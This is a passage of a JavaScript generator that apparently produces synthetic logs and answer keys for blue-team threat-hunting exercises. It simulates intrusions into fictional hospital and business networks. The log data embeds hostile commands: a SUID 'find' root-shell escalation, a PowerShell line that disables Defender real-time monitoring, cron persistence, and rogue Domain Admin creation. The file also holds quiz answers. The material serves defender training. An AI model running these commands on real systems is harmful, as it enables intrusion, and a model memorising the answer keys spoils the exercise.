  for (const when of ['2026-10-29 09:14:50', '2026-10-30 03:22:41', '2026-10-30 22:08:09', '2026-10-31 05:57:30']) out.push(auth(at(when), DB, 'accepted_key', 'redis', ATT3, { fp: FP }));
  // 4. Pivot to the EHR server and use the SUID find binary for root
  out.push(auth(at('2026-10-29 02:51:03'), EHR, 'accepted_key', 'redis', L(DB), { fp: FP }));
  out.push(sudo(at('2026-10-29 02:53:27'), EHR, 'redis', '/home/redis', '/usr/bin/find . -exec /bin/sh -p ; -quit'));
  const w0 = at('2026-10-29 02:58:00');
  ['/login', '/api/v1/patients?limit=500', '/api/v1/patients/export.csv'].forEach((u, k) => out.push(web(w0 + k * 40, EHR, ATT3, 'GET', u, 200, 2100 + k * 4200, 'curl/7.81.0')));
  // 5. Pivot to the domain controller with a stolen admin credential; create svc-hl7 and make it Domain Admin
  out.push(win(at('2026-10-29 03:20:12'), DC, 4624, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3, src_ip: L(EHR), src_port: 52114, Workstation_Name: 'EHR01', Account_Domain: 'RIDGEVIEW' }));
  out.push(win(at('2026-10-29 03:20:12'), DC, 4672, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3 }));
  out.push(win(at('2026-10-29 03:24:07'), DC, 4720, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'svc-hl7', user: 'svc-hl7' }));
  out.push(win(at('2026-10-29 03:24:19'), DC, 4724, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'svc-hl7', user: 'svc-hl7' }));
  out.push(win(at('2026-10-29 03:24:31'), DC, 4728, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'svc-hl7', user: 'svc-hl7', Group_Name: 'Domain Admins', Group_Rid: 512 }));
  out.push(win(at('2026-10-29 03:26:02'), DC, 4624, { user: 'svc-hl7', Account_Name: 'svc-hl7', Logon_Type: 3, src_ip: L(EHR), src_port: 52380, Workstation_Name: 'EHR01', Account_Domain: 'RIDGEVIEW' }));
  // decoy: a legitimate HR account creation on another morning
  out.push(win(at('2026-10-30 08:45:10'), DC, 4720, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'f.ortega', user: 'f.ortega' }));
  out.push(win(at('2026-10-30 08:45:44'), DC, 4728, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'RIDGEVIEW', Target_Account_Name: 'f.ortega', user: 'f.ortega', Group_Name: 'Clinical Staff', Group_Rid: 1121 }));
  // 6. Nurse-station PC: Defender turned off, then a binary dropped into the excluded folder
  out.push(win(at('2026-10-29 03:40:51'), WS, 4624, { user: 'svc-hl7', Account_Name: 'svc-hl7', Logon_Type: 3, src_ip: L(DC), src_port: 49733, Workstation_Name: 'DC01', Account_Domain: 'RIDGEVIEW' }));
  out.push(win(at('2026-10-29 03:41:15'), WS, 4688, { user: 'svc-hl7', Account_Name: 'svc-hl7', New_Process_Name: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true', Creator_Process_Name: 'C:\\Windows\\System32\\services.exe' }));
  out.push(win(at('2026-10-29 03:42:02'), WS, 4688, { user: 'svc-hl7', Account_Name: 'svc-hl7', New_Process_Name: 'C:\\ProgramData\\Updates\\updsvc.exe', Creator_Process_Name: 'C:\\Windows\\System32\\services.exe' }));
  // 7. C2 beacon: ws01 -> 198.51.100.77:9001 every five minutes, allowed outbound
  const b0 = at('2026-10-29 03:46:00'); const nB = Math.floor((ctx.roundStart - b0) / 300);
  span(b0, b0 + nB * 300, nB, (k, t) => out.push(fw(t, FW, L(WS), C2_3, pr(k + 500), 9001, 'pass', 'out')));
  return out;
}

// =====================================================================================================
// Driftless Managed Services (Midwest invitational network): web shell -> reused root password -> rogue Domain Admin
// =====================================================================================================
const ATT4 = '198.51.100.61';
const C2_4 = '203.0.113.140';
const MW_PROFILE = {
  web: 'web', db: 'ecom', mail: 'mail', dc: 'ad', ws: 'win10', fw: 'pan',
  linux: ['web', 'web', 'ecom', 'mail', 'dns'], linuxUsers: ['sysadmin', 'deploy', 'backup'],
  adUsers: ['a.hansen', 'b.lindqvist', 'c.novak', 'd.oyelaran', 'e.ramirez', 'f.schultz', 'g.vang', 'h.whitehorse', 'svc_backup'],
  privUsers: ['Administrator', 'svc_backup'], winMachines: ['WIN10', 'UBUNTU-WKS', 'AD', 'DOCKER'],
  lanHosts: ['win10', 'web', 'ecom', 'mail', 'ad'], lanPrefix: '172.20.242', publicHost: 'www.driftless.example',
  domain: 'driftless.local', netbios: 'DRIFTLESS', dbKind: 'mysql', wp: false,
};

function buildMidwest(ctx) {
  const N = (base, min) => Math.max(min, Math.round(base * ctx.scale));
  const WEB = 'web'; const ECOM = 'ecom'; const DC = 'ad'; const FW = 'pan';
  const out = [];
  const L = (id) => ctx.P.ip(id);
  const PORTS = [21, 22, 25, 53, 80, 110, 135, 443, 445, 2375, 3306, 3389, 5985, 8000, 8089];
  span(at('2026-11-13 21:12:03'), at('2026-11-13 21:15:20'), PORTS.length, (k, t) => out.push(fw(t, FW, ATT4, L(WEB), pr(k + 3), PORTS[k], 'pass', 'in')));
  // Upload through the unrestricted thumbnail form, then commands through the shell it left behind.
  out.push(web(at('2026-11-13 21:31:40'), WEB, ATT4, 'POST', '/uploads/upload.php', 200, 212, 'python-requests/2.25.1'));
  const n = N(60, 16);
  span(at('2026-11-13 21:33:02'), at('2026-11-13 21:49:10'), n, (k, t) => out.push(web(t, WEB, ATT4, 'POST', '/uploads/thumb.php', 200, 180 + k, 'python-requests/2.25.1')));
  // The admin reused the root password on the store server.
  out.push(auth(at('2026-11-13 21:52:37'), ECOM, 'accepted_pw', 'root', L(WEB)));
  out.push(auth(at('2026-11-13 21:52:37'), ECOM, 'session_open', 'root', L(WEB)));
  out.push(sudo(at('2026-11-13 21:58:11'), ECOM, 'root', '/root', '/usr/bin/tee /etc/cron.d/sysstat-upd'));
  const c0 = at('2026-11-13 22:00:00'); const nC = Math.floor((ctx.roundStart - c0) / 600);
  span(c0, c0 + nC * 600, nC, (k, t) => { out.push(cron(t, ECOM, '/usr/local/sbin/sysstat-upd >/dev/null 2>&1')); out.push(fw(t + 1, FW, L(ECOM), C2_4, pr(k + 900), 443, 'pass', 'out')); });
  // Domain admin from a credential found on the store server.
  out.push(win(at('2026-11-13 22:41:09'), DC, 4624, { user: 'Administrator', Account_Name: 'Administrator', Logon_Type: 3, src_ip: L(ECOM), src_port: 49122, Workstation_Name: 'ECOMM', Account_Domain: 'DRIFTLESS' }));
  out.push(win(at('2026-11-13 22:43:52'), DC, 4720, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'DRIFTLESS', Target_Account_Name: 'svc_audit', user: 'svc_audit' }));
  out.push(win(at('2026-11-13 22:44:15'), DC, 4728, { Subject_Account_Name: 'Administrator', Subject_Account_Domain: 'DRIFTLESS', Target_Account_Name: 'svc_audit', user: 'svc_audit', Group_Name: 'Domain Admins', Group_Rid: 512 }));
  return out;
}

const DAY72 = 72 * 3600;
const roundStart = at('2026-10-31 09:00:00');

export const STORIES = {
  'mwccdc-invitational-2026': {
    id: 'mwccdc-invitational-2026', spanSec: DAY72, roundStart: at('2026-11-14 08:00:00'), profile: MW_PROFILE, attacker: ATT4, c2: `${C2_4}:443`,
    build: buildMidwest,
    waveLines: waveLinesGeneric(ATT4, MW_PROFILE),
    hunt: [
      { id: 'attacker_ip', q: 'What outside address got in first?', accept: /198\.51\.100\.61/, explain: 'The same address sweeps the ports, then POSTs to the upload form and the shell in uploads/.' },
      { id: 'vector', q: 'Which file on the web server did it use to run commands?', accept: /thumb\.php/i, explain: 'Repeated POSTs to /uploads/thumb.php: a data directory should not be running code.' },
      { id: 'pivot', q: 'Which box did it move to next, and as which user?', accept: /ecomm?.*root|root.*ecomm?/i, explain: 'An Accepted password for root on ecomm from 172.20.242.10, the web server. The root password had been reused.' },
      { id: 'rogue', q: 'Which account was created and made a Domain Admin?', accept: /svc_audit/i, explain: 'Event 4720 then 4728 on the domain controller for svc_audit.' },
    ],
  },
  'cedarline-lab-2026': {
    id: 'cedarline-lab-2026', spanSec: DAY72, roundStart, profile: CED_PROFILE, attacker: ATT1, c2: `${C2_1}:8443`,
    build: buildCedarline,
    waveLines: waveLinesGeneric(ATT1, CED_PROFILE),
    hunt: [
      { id: 'attacker_ip', q: 'What is the external IP address the attacker used to get in?', accept: /203\.0\.113\.66/, explain: 'The same address sweeps ports on the firewall, enumerates WordPress users, brute-forces wp-login.php, then logs in as root over SSH.' },
      { id: 'vector', q: 'What was the initial access vector?', accept: /wp-?login|wordpress|brute|spray|password guess|default (admin )?password|weak (admin )?password|admin password/i, explain: 'About 1,800 POSTs to /wp-login.php from one address in nine minutes, ending in a 302 and a WordPress "Accepted password for admin". The default admin password was guessed.' },
      { id: 'first_account', q: 'Which account did the attacker compromise first?', accept: /^\s*(wordpress\s+)?admin\s*$|wp[- ]?admin|wordpress admin/i, explain: 'The auth.log line "wordpress(...): Accepted password for admin" from the attacker IP follows a long run of Authentication failure lines.' },
      { id: 'first_login_time', q: 'What time (hh:mm, EDT, 24h or am/pm) was the first successful login?', accept: /\b23:0[67]\b|\b11:0[67](:\d\d)?\s*pm\b/i, explain: 'The 302 on POST /wp-login.php and the WordPress Accepted password line are both at 23:07:12 on Oct 28.' },
      { id: 'backdoor_account', q: 'Which backdoor account was created in Active Directory?', accept: /svc-backup2/i, explain: 'EventCode 4720 on dc01, then 4728 adding it to Domain Admins. Do not confuse it with the legitimate svc-backup.' },
      { id: 'c2', q: 'Where does the workstation beacon to (IP:port)?', accept: /198\.51\.100\.200\D{1,5}8443/, explain: 'Firewall pass lines every five minutes from 10.10.10.50 to 198.51.100.200:8443, starting minutes after the scheduled task SystemCheck was created.' },
    ],
  },
  'harborpoint-lab-2026': {
    id: 'harborpoint-lab-2026', spanSec: DAY72, roundStart, profile: HP_PROFILE, attacker: ATT2, c2: `${C2_2}:4443`,
    build: buildHarbor,
    waveLines: waveLinesGeneric(ATT2, HP_PROFILE),
    hunt: [
      { id: 'attacker_ip', q: 'What is the external IP address the attacker used?', accept: /203\.0\.113\.131/, explain: 'It dumps /.git/ from app01, then connects to PostgreSQL and SSH from the same address.' },
      { id: 'vector', q: 'What was the initial access vector?', accept: /\.git|git (folder|repo|dump|exposure|exposed)|git-dumper|exposed git|source (code )?repo/i, explain: 'Hundreds of 200 responses for /.git/objects/... with the git-dumper user agent. The repo held the database credentials.' },
      { id: 'first_account', q: 'Which account did the attacker use first?', accept: /hp_app/i, explain: 'PostgreSQL "connection authorized: user=hp_app" from the attacker IP, instead of the usual app01 address.' },
      { id: 'first_login_time', q: 'What time (hh:mm, EDT) was the first successful login?', accept: /\b03:41\b|\b3:41(:\d\d)?\s*am\b/i, explain: 'connection authorized for hp_app from 203.0.113.131 at 03:41:07 on Oct 29.' },
      { id: 'backdoor_account', q: 'Which local account was created on the teller workstation?', accept: /svc_update/i, explain: 'EventCode 4720 then 4732 (Administrators) on ws01. Note it is svc_update with an underscore.' },
      { id: 'c2', q: 'Where does the workstation beacon to (IP:port)?', accept: /198\.51\.100\.214\D{1,5}4443/, explain: 'Outbound passes every ten minutes from 10.20.30.55 to 198.51.100.214:4443.' },
    ],
  },
  'ridgeview-lab-2026': {
    id: 'ridgeview-lab-2026', spanSec: DAY72, roundStart, profile: RV_PROFILE, attacker: ATT3, c2: `${C2_3}:9001`,
    build: buildRidgeview,
    waveLines: waveLinesGeneric(ATT3, RV_PROFILE),
    hunt: [
      { id: 'attacker_ip', q: 'What is the external IP address the attacker used?', accept: /203\.0\.113\.88/, explain: 'It sweeps ports on the firewall, hammers 6379 on db01, then logs in over SSH and reaches the EHR server from there.' },
      { id: 'vector', q: 'What was the initial access vector?', accept: /redis|6379|unauth\w* (cache|database|service)|exposed (cache|database)|open (cache|database)/i, explain: 'A burst of firewall passes from one address to db01 port 6379 (Redis), then an SSH login as a user that never logs in from outside: Redis CONFIG SET was used to write an SSH key.' },
      { id: 'first_account', q: 'Which account did the attacker log in with first?', accept: /^\s*(the\s+)?redis(\s+(user|account|service account))?\s*$/i, explain: 'linux_secure on db01: "Accepted publickey for redis from 203.0.113.88". The redis service account should never accept an interactive login.' },
      { id: 'first_login_time', q: 'What time (hh:mm, EDT, 24h or am/pm) was the first successful login?', accept: /\b02:36\b|\b2:36(:\d\d)?\s*am\b/i, explain: 'The Accepted publickey line for redis from the attacker IP is at 02:36:19 on Oct 29.' },
      { id: 'backdoor_account', q: 'Which backdoor account was created in Active Directory?', accept: /svc-hl7/i, explain: 'EventCode 4720 on dc01, then 4728 adding it to Domain Admins. The same morning, f.ortega was a legitimate HR creation.' },
      { id: 'c2', q: 'Where does the workstation beacon to (IP:port)?', accept: /198\.51\.100\.77\D{1,5}9001/, explain: 'Firewall pass lines every five minutes from 10.30.40.55 to 198.51.100.77:9001, starting minutes after Defender was disabled.' },
    ],
  },
};
